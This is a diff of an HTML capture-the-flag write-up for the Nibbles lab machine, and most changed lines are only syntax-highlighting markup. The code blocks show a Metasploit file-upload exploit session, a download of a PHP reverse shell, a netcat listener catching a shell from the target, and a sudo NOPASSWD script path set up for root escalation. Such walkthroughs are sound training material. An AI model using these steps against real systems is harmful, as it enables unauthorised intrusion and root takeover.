 </div><h1 id="privilege-escalation">privilege escalation</h1>
 <p>We can find a personal script in a zip file &hellip; maybe it run as root with sudo?</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">meterpreter &gt; <span style="color:#8be9fd;font-style:italic">bg</span>
-<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Backgrounding session 1...
-msf6 exploit<span style="color:#ff79c6">(</span>multi/http/nibbleblog_file_upload<span style="color:#ff79c6">)</span> &gt; <span style="color:#8be9fd;font-style:italic">cd</span> /tmp
-msf6 exploit<span style="color:#ff79c6">(</span>multi/http/nibbleblog_file_upload<span style="color:#ff79c6">)</span> &gt; sessions <span style="color:#bd93f9">1</span>
-meterpreter &gt; download personal.zip
-<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Downloading: personal.zip -&gt; personal.zip
-<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Downloaded 1.81 KiB of 1.81 KiB <span style="color:#ff79c6">(</span>100.0%<span style="color:#ff79c6">)</span>: personal.zip -&gt; personal.zip
-<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> download   : personal.zip -&gt; personal.zip
-meterpreter &gt; <span style="color:#8be9fd;font-style:italic">bg</span>
-<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Backgrounding session 1...
-msf6 exploit<span style="color:#ff79c6">(</span>multi/http/nibbleblog_file_upload<span style="color:#ff79c6">)</span> &gt; unzip personal.zip
-<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> exec: unzip personal.zip
-
-Archive:  personal.zip
-   creating: personal/
-   creating: personal/stuff/
-  inflating: personal/stuff/monitor.sh
-
-meterpreter &gt; shell
-Process <span style="color:#bd93f9">1360</span> created.
-Channel <span style="color:#bd93f9">0</span> created.
-id
-</code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>meterpreter &gt; <span style="color:#8be9fd;font-style:italic">bg</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Backgrounding session 1...
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#ff79c6">(</span>multi/http/nibbleblog_file_upload<span style="color:#ff79c6">)</span> &gt; <span style="color:#8be9fd;font-style:italic">cd</span> /tmp
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#ff79c6">(</span>multi/http/nibbleblog_file_upload<span style="color:#ff79c6">)</span> &gt; sessions <span style="color:#bd93f9">1</span>
+</span></span><span style="display:flex;"><span>meterpreter &gt; download personal.zip
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Downloading: personal.zip -&gt; personal.zip
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Downloaded 1.81 KiB of 1.81 KiB <span style="color:#ff79c6">(</span>100.0%<span style="color:#ff79c6">)</span>: personal.zip -&gt; personal.zip
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> download   : personal.zip -&gt; personal.zip
+</span></span><span style="display:flex;"><span>meterpreter &gt; <span style="color:#8be9fd;font-style:italic">bg</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Backgrounding session 1...
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#ff79c6">(</span>multi/http/nibbleblog_file_upload<span style="color:#ff79c6">)</span> &gt; unzip personal.zip
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> exec: unzip personal.zip
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Archive:  personal.zip
+</span></span><span style="display:flex;"><span>   creating: personal/
+</span></span><span style="display:flex;"><span>   creating: personal/stuff/
+</span></span><span style="display:flex;"><span>  inflating: personal/stuff/monitor.sh
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>meterpreter &gt; shell
+</span></span><span style="display:flex;"><span>Process <span style="color:#bd93f9">1360</span> created.
+</span></span><span style="display:flex;"><span>Channel <span style="color:#bd93f9">0</span> created.
+</span></span><span style="display:flex;"><span>id
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>We have failed to get a shell from meterpreter :( so we try a non-metasploit exploit</p>
 <h1 id="without-metasploit">Without Metasploit</h1>
@@ -533,122 +533,122 @@ id
 </li>
 </ol>
 <p>get a reverse_php_shell at pentest monkey and change the IP:PORT</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ctf@014202efa8c8:~/htb/nibbles$ curl -Os https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
-ctf@014202efa8c8:~/htb/nibbles$ vi php-reverse-shell.php
-</code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ctf@014202efa8c8:~/htb/nibbles$ curl -Os https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+</span></span><span style="display:flex;"><span>ctf@014202efa8c8:~/htb/nibbles$ vi php-reverse-shell.php
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>We get a shell that we can upgrade with python:</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ctf@014202efa8c8:~/htb/nibbles$ curl http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php
-
-────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-
-ctf@014202efa8c8:~$ rlwrap nc -lnvp <span style="color:#bd93f9">9000</span>
-Listening on 0.0.0.0 <span style="color:#bd93f9">9000</span>
-Connection received on 172.19.0.1 <span style="color:#bd93f9">56658</span>
-Linux Nibbles 4.4.0-104-generic <span style="color:#6272a4">#127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux</span>
- 04:18:28 up <span style="color:#bd93f9">55</span> min,  <span style="color:#bd93f9">0</span> users,  load average: 0.00, 0.00, 0.00
-USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
-<span style="color:#8be9fd;font-style:italic">uid</span><span style="color:#ff79c6">=</span>1001<span style="color:#ff79c6">(</span>nibbler<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">gid</span><span style="color:#ff79c6">=</span>1001<span style="color:#ff79c6">(</span>nibbler<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">groups</span><span style="color:#ff79c6">=</span>1001<span style="color:#ff79c6">(</span>nibbler<span style="color:#ff79c6">)</span>
-/bin/sh: 0: can<span style="color:#f1fa8c">&#39;t access tty; job control turned off
-</span><span style="color:#f1fa8c">$ python -c &#39;</span>import pty; pty.spawn<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;/bin/bash&#34;</span><span style="color:#ff79c6">)</span><span style="color:#f1fa8c">&#39;
-</span><span style="color:#f1fa8c">/bin/sh: 1: python: not found
-</span><span style="color:#f1fa8c">$ python3 -c &#39;</span>import pty; pty.spawn<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;/bin/bash&#34;</span><span style="color:#ff79c6">)</span>&#39;
-nibbler@Nibbles:/$
-</code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ctf@014202efa8c8:~/htb/nibbles$ curl http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ctf@014202efa8c8:~$ rlwrap nc -lnvp <span style="color:#bd93f9">9000</span>
+</span></span><span style="display:flex;"><span>Listening on 0.0.0.0 <span style="color:#bd93f9">9000</span>
+</span></span><span style="display:flex;"><span>Connection received on 172.19.0.1 <span style="color:#bd93f9">56658</span>
+</span></span><span style="display:flex;"><span>Linux Nibbles 4.4.0-104-generic <span style="color:#6272a4">#127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux</span>
+</span></span><span style="display:flex;"><span> 04:18:28 up <span style="color:#bd93f9">55</span> min,  <span style="color:#bd93f9">0</span> users,  load average: 0.00, 0.00, 0.00
+</span></span><span style="display:flex;"><span>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">uid</span><span style="color:#ff79c6">=</span>1001<span style="color:#ff79c6">(</span>nibbler<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">gid</span><span style="color:#ff79c6">=</span>1001<span style="color:#ff79c6">(</span>nibbler<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">groups</span><span style="color:#ff79c6">=</span>1001<span style="color:#ff79c6">(</span>nibbler<span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span>/bin/sh: 0: can<span style="color:#f1fa8c">&#39;t access tty; job control turned off
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">$ python -c &#39;</span>import pty; pty.spawn<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;/bin/bash&#34;</span><span style="color:#ff79c6">)</span><span style="color:#f1fa8c">&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">/bin/sh: 1: python: not found
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">$ python3 -c &#39;</span>import pty; pty.spawn<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;/bin/bash&#34;</span><span style="color:#ff79c6">)</span>&#39;
+</span></span><span style="display:flex;"><span>nibbler@Nibbles:/$
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>We have sudo privilege for a script in our HOME directorys</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nibbler@Nibbles:/$ sudo -l
-sudo -l
-sudo: unable to resolve host Nibbles: Connection timed out
-Matching Defaults entries <span style="color:#ff79c6">for</span> nibbler on Nibbles:
-    env_reset, mail_badpass,
-    <span style="color:#8be9fd;font-style:italic">secure_path</span><span style="color:#ff79c6">=</span>/usr/local/sbin<span style="color:#f1fa8c">\:</span>/usr/local/bin<span style="color:#f1fa8c">\:</span>/usr/sbin<span style="color:#f1fa8c">\:</span>/usr/bin<span style="color:#f1fa8c">\:</span>/sbin<span style="color:#f1fa8c">\:</span>/bin<span style="color:#f1fa8c">\:</span>/snap/bin
-
-User nibbler may run the following commands on Nibbles:
-    <span style="color:#ff79c6">(</span>root<span style="color:#ff79c6">)</span> NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
-nibbler@Nibbles:/$ ls /home/nibbler/personal/stuff/monitor.sh
-ls /home/nibbler/personal/stuff/monitor.sh
-ls: cannot access <span style="color:#f1fa8c">&#39;/home/nibbler/personal/stuff/monitor.sh&#39;</span>: No such file or directory
-nibbler@Nibbles:/$
-</code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nibbler@Nibbles:/$ sudo -l
+</span></span><span style="display:flex;"><span>sudo -l
+</span></span><span style="display:flex;"><span>sudo: unable to resolve host Nibbles: Connection timed out
+</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#ff79c6">for</span> nibbler on Nibbles:
+</span></span><span style="display:flex;"><span>    env_reset, mail_badpass,
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">secure_path</span><span style="color:#ff79c6">=</span>/usr/local/sbin<span style="color:#f1fa8c">\:</span>/usr/local/bin<span style="color:#f1fa8c">\:</span>/usr/sbin<span style="color:#f1fa8c">\:</span>/usr/bin<span style="color:#f1fa8c">\:</span>/sbin<span style="color:#f1fa8c">\:</span>/bin<span style="color:#f1fa8c">\:</span>/snap/bin
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User nibbler may run the following commands on Nibbles:
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">(</span>root<span style="color:#ff79c6">)</span> NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
+</span></span><span style="display:flex;"><span>nibbler@Nibbles:/$ ls /home/nibbler/personal/stuff/monitor.sh
+</span></span><span style="display:flex;"><span>ls /home/nibbler/personal/stuff/monitor.sh
+</span></span><span style="display:flex;"><span>ls: cannot access <span style="color:#f1fa8c">&#39;/home/nibbler/personal/stuff/monitor.sh&#39;</span>: No such file or directory
+</span></span><span style="display:flex;"><span>nibbler@Nibbles:/$
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>The file does not exists but we have permissions to create it</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
